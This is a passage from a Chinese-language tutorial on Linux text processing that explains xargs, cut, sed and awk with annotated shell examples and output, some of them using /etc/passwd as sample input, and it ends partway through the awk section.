<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> *.jpg | xargs -n1 -I &#123;&#125; <span class="built_in">cp</span> &#123;&#125; /data/images</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>选项<code>-n</code> 后面加次数，表示命令在执行的时候一次用的argument的个数，默认是用所有的。</p>
<p><strong>xargs 结合 find 使用</strong></p>
<p>用 rm 删除太多的文件时候，可能得到一个错误信息：<strong>/bin/rm Argument list too long.</strong> 用 xargs 去避免这个问题：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.log&quot;</span> -print0 | xargs -<span class="number">0</span> rm -f</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>xargs -0 将 \0 作为定界符。</p>
<p>统计一个源代码目录中所有 php 文件的行数：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.php&quot;</span> -print0 | xargs -<span class="number">0</span> wc -l</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>查找所有的 jpg 文件，并且压缩它们：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> . -type f -name <span class="string">&quot;*.jpg&quot;</span> -<span class="built_in">print</span> | xargs tar -czvf images.tar.gz</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>批量下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> url-list.txt | xargs wget -c</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>wget的<code>-c</code>选项表示断点续传。</p>
<h2 id="文本编辑命令">文本编辑命令</h2>
<h3 id="cut命令">cut命令</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">选项与参数：</span><br><span class="line">-d  ：后面接分隔字符。与 -f 一起使用；</span><br><span class="line">-f  ：依据 -d 的分隔字符将一段信息分割成为数段，用 -f 取出第几段的意思；</span><br><span class="line">-c  ：以字符 (characters) 的单位取出固定字符区间；</span><br></pre></td></tr></table></figure>
<p>cut以行为单位，根据分隔符把行分成若干列，这样就可以指定选取哪些列了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27;分隔字符&#x27;</span> -f 选取的列数</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2  	--选取第2列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3,5  	--选取第3列和第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-5  	--选取第3列到第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-   	--选取第3列到最后1列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1-3,5	--选取第1到第3列还有第5列</span><br></pre></td></tr></table></figure>
<p>只显示/etc/passwd的用户和shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat /etc/passwd | cut -d &#x27;:&#x27; -f 1,7 </span></span><br><span class="line">root:/bin/bash</span><br><span class="line">daemon:/bin/sh</span><br><span class="line">bin:/bin/sh</span><br></pre></td></tr></table></figure>
<h3 id="sed命令">sed命令</h3>
<p>sed 可依照脚本的指令来处理、编辑文本文件。</p>
<p>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p>
<p>语法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed [-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>-e &lt;script&gt;</code>以指定的script来处理输入的文本文件。</p>
</li>
<li class="lvl-2">
<p><code>-f&lt;script文件&gt;</code>以指定的script文件来处理输入的文本文件。</p>
</li>
<li class="lvl-2">
<p><code>-n</code>仅显示script处理后的结果，一般跟p动作搭配使用。</p>
</li>
<li class="lvl-2">
<p><code>-i</code>使用处理后的结果修改文件。</p>
</li>
</ul>
<p><strong>动作说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>a：在指定行后面插入内容</p>
</li>
<li class="lvl-2">
<p>i：在指定行前面插入内容</p>
</li>
<li class="lvl-2">
<p>d：删除指定行</p>
</li>
<li class="lvl-2">
<p>c ：替换指定行</p>
</li>
<li class="lvl-2">
<p>p ：打印指定行的数据，通常需要跟<code>-n</code>选项搭配使用</p>
</li>
<li class="lvl-2">
<p>s ：替换指定字符，兼容vim的替换语法，例如 1,20s/old/new/g</p>
</li>
</ul>
<h4 id="元字符集">元字符集</h4>
<p>sed支持一般的正则表达式，下面是支持的正则语法：<code>^</code>行的开始 如：/^sed/匹配所有以sed开头的行。<code>$</code>行的结束 如：/sed$/匹配所有以sed结尾的行。<code>.</code>匹配一个非换行符的任意字符 如：/s.d/匹配s后接一个任意字符，然后是d。<code>*</code>匹配零或多个字符 如：/*sed/匹配所有模板是一个或多个空格后紧跟sed的行。<code>[]</code>匹配一个指定范围内的字符，如<code>/[Ss]ed/</code>匹配sed和Sed。<code>[^]</code>匹配一个不在指定范围内的字符，如：<code>/[^A-RT-Z]ed/</code>匹配不包含A-R和T-Z的一个字母开头，紧跟ed的行。<code>\(..\)</code>保存匹配的字符，如s/(love)able/\1rs，loveable被替换成lovers。<code>&amp;</code>保存搜索字符用来替换其他字符，如<code>s/love/**&amp;**/</code>，love这成<code>**love**</code>。<code>\&lt;</code>单词的开始，如:/&lt;love/匹配包含以love开头的单词的行。<code>\&gt;</code>单词的结束，如/love&gt;/匹配包含以love结尾的单词的行。<code>x\+</code>重复字符x，至少1次，如：<code>/o\+/</code>匹配至少有1个o的行。<code>x\&#123;m\&#125;</code>重复字符x，m次，如：<code>/o\&#123;5\&#125;/</code>匹配包含5个o的行。<code>x\&#123;m,\&#125;</code>重复字符x,至少m次，如：<code>/o\&#123;5,\&#125;/</code>匹配至少有5个o的行。<code>x\&#123;m,n\&#125;</code>重复字符x，至少m次，不多于n次，如：<code>/o\&#123;5,10\&#125;/</code>匹配5-10个o的行。</p>
<h4 id="a-i-在指定行位置添加行">a|i:在指定行位置添加行</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# <span class="built_in">cat</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line"></span><br><span class="line">[root@rocky8:Corazon]# sed -e 2a\newline a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>默认情况下<code>-e</code>参数可以省略：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# <span class="built_in">cat</span> a | sed <span class="string">&#x27;2a\newline&#x27;</span></span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line">[root@rocky8:~]# sed 2a\newline a</span><br><span class="line">NUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;2a newline&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>在第二行之前添加一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;2i newline&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line">newline</span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>最后一行加入 <code># This is a test</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;$a # This is a test&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a test</span></span><br></pre></td></tr></table></figure>
<p>同时添加多行：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# cat a|sed <span class="string">&#x27;2a\newline1\</span></span><br><span class="line"><span class="string">&gt; newline2&#x27;</span></span><br><span class="line">LINUX!  </span><br><span class="line"> Linux <span class="keyword">is</span> a free unix-<span class="keyword">type</span> opterating <span class="keyword">system</span>.  </span><br><span class="line">newline1</span><br><span class="line">newline2</span><br><span class="line"> This <span class="keyword">is</span> a linux testfile!  </span><br><span class="line"> Linux test</span><br></pre></td></tr></table></figure>
<h4 id="d-删除指定行">d:删除指定行</h4>
<p>将 /etc/passwd 的内容列出行号，并将第 2~5 行删除！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;2,5d&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">.....(后面省略).....</span><br></pre></td></tr></table></figure>
<p>只删除第2行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> /etc/passwd | sed <span class="string">&#x27;2d&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>删除第3到最后一行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> /etc/passwd | sed <span class="string">&#x27;3,$d&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>删除/etc/passwd所有包含<code>/sbin/nologin</code>的行，其他行输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;/\/sbin\/nologin/d&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">     8	halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">    25	zah:x:1000:1000:Zah:/home/zah:/bin/bash</span><br><span class="line">    26	Cora:x:1002:1002::/home/Cora:/bin/bash</span><br><span class="line">    27	Corazon:x:1003:1003::/home/Corazon:/bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="c-替换指定行">c:替换指定行</h4>
<p>将第2-5行的内容替换成为『No 2-5 number』：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;2,5c No 2-5 number&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">No 2-5 number</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br></pre></td></tr></table></figure>
<h4 id="p-仅显示指定行">p:仅显示指定行</h4>
<p>不加<code>-n</code>选项时，除了输出匹配行，还同时会输出所有行，所以需要加<code>-n</code>选项。</p>
<p>仅列出 /etc/passwd 文件内的第 5-7 行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed -n <span class="string">&#x27;5,7p&#x27;</span></span><br><span class="line">     5	lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br></pre></td></tr></table></figure>
<p>搜索 /etc/passwd有root关键字的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> /etc/passwd|sed -n <span class="string">&#x27;/root/p&#x27;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">[root@rocky8:~]# sed -n <span class="string">&#x27;/root/p&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>打印/etc/passwd有以root和bin开头之间的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# sed -n <span class="string">&#x27;/^root/,/^bin/p&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>打印从第五行开始到第一个包含以<code>/usr/games</code>开始的行之间的所有行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd | sed -n <span class="string">&#x27;5,\/usr\/games/p&#x27;</span></span><br><span class="line">     5	lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">     8	halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">     9	mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">    10	operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">    11	games:x:12:100:games:/usr/games:/sbin/nologin</span><br></pre></td></tr></table></figure>
<h4 id="s-字符串替换">s:字符串替换</h4>
<p>语法：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sed</span> <span class="string">&#x27;s/要被取代的字串/新的字串/g&#x27;</span></span><br></pre></td></tr></table></figure>
<p>不论什么字符，紧跟着s命令的都被认为是新的分隔符.</p>
<p><code>sed 's#10#100#g'</code>表示把所有10替换成100，“#”在这里是分隔符，代替了默认的“/”分隔符。</p>
<p>提取本机所有的ip地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ifconfig | grep <span class="string">&#x27;inet &#x27;</span></span><br><span class="line">        inet 10.0.0.191  netmask 255.255.255.0  broadcast 10.0.0.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">[root@rocky8:~]# ifconfig | grep <span class="string">&#x27;inet &#x27;</span>|sed <span class="string">&#x27;s/^[^0-9]*\([0-9\.]*\).*$/\1/g&#x27;</span></span><br><span class="line">10.0.0.191</span><br><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>
<p>对于以root和bin开头之间的行，每行的末尾添加sed test：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> /etc/passwd | sed <span class="string">&#x27;/^root/,/^bin/s/$/--sed test/&#x27;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash--sed <span class="built_in">test</span></span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin--sed <span class="built_in">test</span></span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin--sed <span class="built_in">test</span></span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h4 id="y-单字符替换">y:单字符替换</h4>
<p>跟s一样也用于替换，不过s替换的是整体，y替换的是每一字母对应的单个字母</p>
<p>把data中的第一行至第三行中的a替换成A，b替换成B，c替换成C：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;1,3y/abc/ABC/&#x27;</span> data </span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> | sed <span class="string">&#x27;y/13/34/&#x27;</span></span><br><span class="line">324</span><br><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;axxbxxcxx&quot;</span> | sed <span class="string">&#x27;y/abc/123/&#x27;</span></span><br><span class="line">1xx2xx3xx</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：单个字符转换用y，字符串转换用<code>'s/str1/str2/g'</code></font></p>
<h4 id="hHgG模式空间与保持空间"><code>hHgG</code>模式空间与保持空间</h4>
<p>首先介绍一下模式空间和保持空间:</p>
<blockquote>
<p><strong>（H、h、G、g、x）</strong><br>
<strong>模式空间：</strong><a href="https://so.csdn.net/so/search?q=sed&amp;spm=1001.2101.3001.7020">sed</a>处理文本内容行的一个临时缓冲区，模式空间中的内容会主动打印到标准输出，并自动清空模式空间</p>
<p>**保持空间：**sed处理文本内容行的另一个临时缓冲区，不同的是保持空间内容不会主动清空，也不会主动打印到标准输出，而是需要<a href="https://so.csdn.net/so/search?q=sed%E5%91%BD%E4%BB%A4&amp;spm=1001.2101.3001.7020">sed命令</a>来进行处理</p>
</blockquote>
<p>模式空间与保持空间的关系:</p>
<blockquote>
<p>**模式空间：**相当于流水线，文本行再模式空间中进行处理；<br>
**保持空间：**相当于仓库，在模式空间对数据进行处理时，可以把数据临时存储到保持空间；作为模式空间的一个辅助临时缓冲区，但又是相互独立，可以进行交互，命令可以寻址模式空间但是不能寻址保持空间。可以使用高级命令h,H,g,G与模式空间进行交互。</p>
</blockquote>
<p>实际上， 保持空间是模式空间一个临时存放数据的缓冲区，协助模式空间进行数据处理。</p>
<p>相关命令的作用：</p>
<blockquote>
<p><strong>d</strong>     Delete pattern space.  Start next cycle.<br>
删除pattern space的内容，开始下一个循环</p>
<p><strong>h H</strong>   Copy/append pattern space to hold space.<br>
复制/追加pattern space的内容到hold space.（复制会覆盖原内容）</p>
<p><strong>g G</strong>   Copy/append hold space to pattern space.<br>
复制/追加hold space的内容到pattern space. （复制会覆盖原内容）</p>
<p><strong>x</strong>    Exchange the contents of the  hold  and  pattern spaces.<br>
交换hold space和pattern space的内容.</p>
</blockquote>
<p>h命令是将当前模式空间中内容覆盖至保持空间，H命令是将当前模式空间中的内容追加至保持空间</p>
<p>g命令是将当前保持空间中内容覆盖至模式空间，G命令是将当前保持空间中的内容追加至模式空间</p>
<p>模拟tac命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> num</span><br><span class="line">One</span><br><span class="line">Two</span><br><span class="line">Three</span><br><span class="line">[root@rocky8:~]# <span class="built_in">tac</span> num</span><br><span class="line">Three</span><br><span class="line">Two</span><br><span class="line">One</span><br><span class="line">[root@rocky8:~]# sed <span class="string">&#x27;1!G;h;$!d&#x27;</span> num</span><br><span class="line">Three</span><br><span class="line">Two</span><br><span class="line">One</span><br></pre></td></tr></table></figure>
<p>1!G第1行不 执行“G”命令，从第2行开始执行。</p>
<p>$!d，最后一行不删除（保留最后1行）（只有最后一行不删）</p>
<p>原理图：</p>
<p><img src="/posts/247a4e5f//image-20250219211455837.png" alt="image-20250219211455837"></p>
<p>递增序列：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@rocky8</span>:~]<span class="meta"># seq 3|sed <span class="string">&#x27;H;g&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">[root<span class="symbol">@rocky8</span>:~]<span class="meta"># seq 3|sed <span class="string">&#x27;1h;1!H;g&#x27;</span></span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h4 id="多次指定-e选项进行多点编辑">多次指定<code>-e</code>选项进行多点编辑</h4>
<p>删除/etc/passwd第三行到末尾的数据，并把bash替换为blueshell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd | sed -e <span class="string">&#x27;3,$d&#x27;</span> -e <span class="string">&#x27;s/bash/blueshell/&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/blueshell</span><br><span class="line">     2	daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>删除一个文件以#开头的行和空行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> abc</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line"><span class="comment"># aaa</span></span><br><span class="line"></span><br><span class="line">ddd</span><br><span class="line"></span><br><span class="line"><span class="comment"># sss</span></span><br><span class="line">eeee</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rocky8:~]# sed -e <span class="string">&#x27;/^#/d&#x27;</span> -e <span class="string">&#x27;/^$/d&#x27;</span> abc</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">ddd</span><br><span class="line">eeee</span><br></pre></td></tr></table></figure>
<p>也可以通过<code>;</code>实现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;3,$d;s/bash/blueshell/&#x27;</span> </span><br><span class="line">     1	root:x:0:0:root:/root:/bin/blueshell</span><br><span class="line">     2	daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">[root@rocky8:~]# sed <span class="string">&#x27;/^#/d;/^$/d&#x27;</span> abc</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">ddd</span><br><span class="line">eeee</span><br></pre></td></tr></table></figure>
<h4 id="选项-i直接修改文件内容">选项<code>-i</code>直接修改文件内容</h4>
<p>默认情况下sed命令仅仅只是将处理结果显示在控制台，加<code>-i</code>选项则会修改文件内容。</p>
<p>将 regular_express.txt 内每一行结尾若为 . 则换成 !</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> re</span><br><span class="line">taobao.</span><br><span class="line">google.</span><br><span class="line">taobao.</span><br><span class="line">facebook.</span><br><span class="line">zhihu-</span><br><span class="line">weibo-</span><br><span class="line">[root@rocky8:~]# sed -i <span class="string">&#x27;s/\.$/\!/&#x27;</span> re</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> re</span><br><span class="line">taobao!</span><br><span class="line">google!</span><br><span class="line">taobao!</span><br><span class="line">facebook!</span><br><span class="line">zhihu-</span><br><span class="line">weibo-</span><br></pre></td></tr></table></figure>
<h3 id="awk命令">awk命令</h3>
<p>AWK是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
<p>之所以叫AWK是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk [选项参数] <span class="string">&#x27;script&#x27;</span> var=value file(s)</span><br><span class="line">或</span><br><span class="line">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure>
<p><strong>选项参数说明：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-F fs or --field-separator fs<br>
指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。</p>
</li>
<li class="lvl-2">
<p>-v var=value or --asign var=value<br>
赋值一个用户定义变量。</p>
</li>
<li class="lvl-2">
<p>-f scripfile or --file scriptfile<br>
从脚本文件中读取awk命令。</p>
</li>
</ul>
<h4 id="基本用法">基本用法</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;[pattern] action&#125;&#x27;</span> file</span><br></pre></td></tr></table></figure>
<p>每行按空格或TAB分割，使用<code>print</code>输出文本中的1、4列：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk &#x27;</span>&#123;<span class="built_in">print</span> <span class="variable">$1</span>,<span class="variable">$4</span>&#125;<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">2 a</span></span><br><span class="line"><span class="string">3 like</span></span><br><span class="line"><span class="string">This&#x27;</span>s </span><br><span class="line">10 orange,apple,mongo</span><br></pre></td></tr></table></figure>
<p>使用<code>printf</code>格式化输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;printf &quot;%-8s %-10s\n&quot;,$1,$4&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">2        a         </span><br><span class="line">3        like      </span><br><span class="line">This<span class="string">&#x27;s             </span></span><br><span class="line"><span class="string">10       orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<h5 id="F指定分割字符"><code>-F</code>指定分割字符</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F  <span class="comment">#-F相当于内置变量FS, 指定分割字</span></span><br></pre></td></tr></table></figure>
<p>使用:分割,取/etc/passwd文件每个用户对应shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -F: <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span> /etc/passwd</span><br><span class="line">root /bin/bash</span><br><span class="line">daemon /sbin/nologin</span><br><span class="line">bin /sbin/nologin</span><br><span class="line">adm /sbin/nologin</span><br><span class="line">lp /sbin/nologin</span><br><span class="line"><span class="built_in">sync</span> /bin/sync</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>同时使用:和/l两个分隔符分割/etc/passwd文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -F <span class="string">&#x27;[:\/]&#x27;</span> <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span>  /etc/passwd</span><br><span class="line">awk: warning: escape sequence `\/<span class="string">&#x27; treated as plain `/&#x27;</span></span><br><span class="line">root root</span><br><span class="line">daemon sbin</span><br><span class="line">bin bin</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h5 id="v设置变量"><code>-v</code>设置变量</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -v  <span class="comment"># 设置变量</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk -va=1 &#x27;</span>&#123;<span class="built_in">print</span> <span class="variable">$1</span>,<span class="variable">$1</span>+a&#125;<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">2 3</span></span><br><span class="line"><span class="string">3 4</span></span><br><span class="line"><span class="string">This&#x27;</span>s 1</span><br><span class="line">10 11</span><br><span class="line">[root@rocky8:~]# awk -va=1 -vb=s <span class="string">&#x27;&#123;print $1,$1+a,$1b&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">2 3 2s</span><br><span class="line">3 4 3s</span><br><span class="line">This<span class="string">&#x27;s 1 This&#x27;</span>ss</span><br><span class="line">10 11 10s</span><br></pre></td></tr></table></figure>
<h5 id="f指定awk脚本"><code>-f</code>指定awk脚本</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -f &#123;awk脚本&#125; &#123;文件名&#125;</span><br></pre></td></tr></table></figure>
<p>脚本模块：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>BEGIN{ 这里面放的是执行前的语句 }</p>
</li>
<li class="lvl-2">
<p>END {这里面放的是处理完所有的行后要执行的语句 }</p>
</li>
